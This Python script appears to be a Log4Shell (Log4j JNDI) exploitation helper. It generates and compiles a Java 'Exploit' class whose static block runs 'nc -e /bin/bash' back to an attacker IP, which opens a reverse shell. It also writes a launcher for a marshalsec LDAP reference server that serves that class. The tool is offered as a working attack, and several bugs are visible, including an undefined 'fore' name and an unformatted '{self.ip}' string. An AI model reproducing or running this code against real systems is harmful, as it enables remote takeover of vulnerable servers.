import argparse,multiprocessing,os,sys,time
from colorama import Fore
from multiprocessing import Process
parser = argparse.ArgumentParser()
parser.add_argument('-ip','--attackerip',metavar='',help='IP of the Attacker Machine. (Ex. 127.0.0.1)')
args = parser.parse_args()
BWhite = '\033[1;37m'   
BGreen = '\033[1;32m'
class Ldap(object):
    def __init__(self,ip):
        self.ip  = ip

    @staticmethod
    def banner(s):
        for c in s + '\n':
            sys.stdout.write(BGreen + c + Fore.WHITE)
            sys.stdout.flush()
            time.sleep(1.5 / 100)
        print(Fore.WHITE + "─" * 43)
        print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Github:https://github.com/FonderElite')
        print(Fore.WHITE + "─" * 43)
        time.sleep(1)
        os.system("clear")
    @staticmethod
    def java_exploit():
        exploit ="""
public class Exploit {{
    static {{
        try {{
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash {hostip} 9999");
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
        """.format(hostip=args.attackerip)
        if os.path.isfile("Exploit.java") == False:
            os.system("touch Exploit.java")
            with open("Exploit.java","w") as exploitf:
                exploitf.write(exploit)
                print(f'{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}]Creating Exploit.java file.')
                time.sleep(0.5)
            print(f'{fore.WHITE}[{fore.YELLOW}!{fore.WHITE}]Compiling Exploit.')
            try:
                os.system("javac Exploit.java -source 8 -target 8")
            except Exception:
                print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Compilation Failed.")
            time.sleep(0.5)
        elif os.path.isfile("Exploit.java") == True:
            print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Compiling Java Exploit.')
            try:
                os.system("javac Exploit.java -source 8 -target 8")
            except Exception:
                print(f"{fore.WHITE}[{fore.RED}-{fore.WHITE}]Compilation Failed.")
    def ldap_server(self):
        exec_cmd = lambda x : os.system(x)
        command = 'java -cp ~/.config/Log4j_exploit/marshalsec/target/marshalsec-0.0.3-SNAPSHT-all.jar marshalsec.jndi.LDAPRefServer "http://{self.ip}:8000/#Exploit"'
        print(Fore.CYAN + "─" * 43)
        print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Server: http://{self.ip}:8000/#Exploit')
        print(Fore.CYAN + "─" * 43)
        time.sleep(1)
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now execute start_ldapserver.sh")
        print(Fore.CYAN + "─" * 43)
        if os.path.isfile("start_ldapserver.sh") == True:
            with open("start_ldapserver.sh","w") as open_file:
                open_file.write(command)
                open_file.close()
        elif os.path.isfile("start_ldapserver.sh") == False:
            exec_cmd("touch start_ldapserver.sh && chmod 777 start_ldapserver.sh")

if __name__ == "__main__":
    log4j_class = Ldap(args.attackerip)
    banner = Process(target=log4j_class.banner, args=("""
╦  ┌┬┐┌─┐┌─┐   ╔═╗┌─┐┬─┐┬  ┬┌─┐┬─┐ ┌─┐┬ ┬
║   ││├─┤├─┘───╚═╗├┤ ├┬┘└┐┌┘├┤ ├┬┘ ├─┘└┬┘
╩═╝─┴┘┴ ┴┴     ╚═╝└─┘┴└─ └┘ └─┘┴└─o┴   ┴
        """,))
    java_exploit = Process(target=log4j_class.java_exploit)
    ldap_server = Process(target=log4j_class.ldap_server)
    if args.attackerip == None:
        print(BWhite + "Usage: " + Fore.CYAN + "python3 " + Fore.WHITE + "<ldap_server.py>" + Fore.GREEN + " -ip" + Fore.WHITE + " <target-ip>")
    elif args.attackerip != None:
        banner.start()
        banner.join()
        java_exploit.start()
        java_exploit.join()
        if os.path.isfile("/usr/bin/javac") == True:
            ldap_server.start()
            ldap_server.join()
        elif os.path.isfile("/usr/bin/javac") == False:
          print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Compilation Failed.")






